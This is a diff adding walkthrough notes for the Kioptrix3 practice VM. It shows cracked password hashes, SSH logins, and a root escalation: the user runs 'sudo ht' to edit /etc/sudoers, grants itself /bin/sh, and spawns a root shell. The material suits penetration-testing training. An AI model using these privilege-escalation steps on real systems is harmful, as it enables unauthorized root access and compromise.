@@ -1,0 +1,105 @@
+1 	dreg 	       0d3eccfb887aabd50f243b3f155c0f85  (Cracked: Mast3r)
+2 	loneferret 	 5badcaf789d3d1d09794d8f021f40f0e  (Cracked: starwars)
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+root@Blue3:~# ssh dreg@172.16.35.128
+The authenticity of host '172.16.35.128 (172.16.35.128)' can't be established.
+RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.16.35.128' (RSA) to the list of known hosts.
+dreg@172.16.35.128's password:
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+dreg@Kioptrix3:~$
+dreg@Kioptrix3:~$ pwd
+/home/dreg
+dreg@Kioptrix3:~$ ls -ltra
+total 20
+-rw-r--r-- 1 dreg dreg  586 2011-04-16 07:54 .profile
+-rw-r--r-- 1 dreg dreg 2940 2011-04-16 07:54 .bashrc
+-rw-r--r-- 1 dreg dreg  220 2011-04-16 07:54 .bash_logout
+drwxr-xr-x 5 root root 4096 2011-04-16 07:54 ..
+drwxr-xr-x 2 dreg dreg 4096 2011-04-16 07:54 .
+
+dreg@Kioptrix3:~$ cd ../
+-rbash: cd: restricted
+
+=> T___T
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+root@Blue3:~# ssh loneferret@172.16.35.128
+loneferret@172.16.35.128's password:
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
+loneferret@Kioptrix3:~$ pwd
+/home/loneferret
+loneferret@Kioptrix3:~$ ls -ltra
+total 64
+-rwxrwxr-x 1 root       root       26275 2011-01-12 10:45 checksec.sh
+-rw-r--r-- 1 loneferret loneferret   586 2011-04-11 17:00 .profile
+-rw-r--r-- 1 loneferret loneferret  2940 2011-04-11 17:00 .bashrc
+-rw-r--r-- 1 loneferret loneferret   220 2011-04-11 17:00 .bash_logout
+-rw-r--r-- 1 loneferret loneferret     0 2011-04-11 18:00 .sudo_as_admin_successful
+drwx------ 2 loneferret loneferret  4096 2011-04-14 11:05 .ssh
+-rw------- 1 root       root          15 2011-04-15 21:21 .nano_history
+drwxr-xr-x 5 root       root        4096 2011-04-16 07:54 ..
+-rw-r--r-- 1 root       root         224 2011-04-16 08:51 CompanyPolicy.README
+drwxr-xr-x 3 loneferret loneferret  4096 2011-04-17 08:59 .
+-rw-r--r-- 1 loneferret users         13 2011-04-18 11:44 .bash_history
+loneferret@Kioptrix3:~$ cat CompanyPolicy.README
+Hello new employee,
+It is company policy here to use our newly installed software for editing, creating and viewing files.
+Please use the command 'sudo ht'.
+Failure to do so will result in you immediate termination.
+
+DG
+CEO
+loneferret@Kioptrix3:~$ sudo ht
+Error opening terminal: xterm-256color.
+loneferret@Kioptrix3:~$ TERM=xterm
+loneferret@Kioptrix3:~$ whereis ht
+ht: /usr/local/bin/ht
+loneferret@Kioptrix3:~$ sudo ht
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+=> CTRL + ALT + F1
+=> (F3) Open /etc/sudoers
+=> Edit: loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/sh
+
+=> loneferret@Kioptrix3:~$ sudo /bin/sh
+whoami
+root
